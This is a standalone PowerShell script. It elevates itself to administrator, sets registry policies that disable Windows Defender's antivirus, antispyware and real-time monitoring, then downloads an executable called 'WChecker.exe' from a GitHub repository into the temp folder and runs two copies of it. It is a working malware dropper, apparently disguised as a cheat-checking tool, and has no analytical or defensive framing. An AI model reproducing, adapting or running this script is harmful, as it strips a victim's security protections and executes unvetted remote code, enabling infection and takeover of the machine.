Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { $workingDirOverride = (Get-Location).Path }

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"
$SignatureUpdatesKey = "Signature Updates"
$SpynetKey = "Spynet"

$DisableAntiSpywareValue = "DisableAntiSpyware"
$DisableAntiVirusValue = "DisableAntiVirus"
$DisableRealtimeMonitoringValue = "DisableRealtimeMonitoring"

if (!(Test-Path $DefenderPath)) { New-Item -Path $DefenderPath -Force }
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force
New-Item -Path "$DefenderPath\$SignatureUpdatesKey" -Force
New-Item -Path "$DefenderPath\$SpynetKey" -Force

New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiSpywareValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableAntiVirusValue" -Value "1" -PropertyType Dword -Force
New-ItemProperty -Path "$DefenderPath" -Name "$DisableRealtimeMonitoringValue" -Value "1" -PropertyType Dword -Force

Write-Host "Defender disabled" -ForegroundColor Green

$tempFolder = [System.IO.Path]::GetTempPath()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/WChecker.exe"
$dest1 = Join-Path $tempFolder "WChecker1.exe"
$dest2 = Join-Path $tempFolder "WChecker2.exe"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

try { $wc.DownloadFile($url, $dest1); Start-Process $dest1 } catch { Write-Host "Error 1" }
try { $wc.DownloadFile($url, $dest2); Start-Process $dest2 } catch { Write-Host "Error 2" }

Write-Host "Done"
Pause
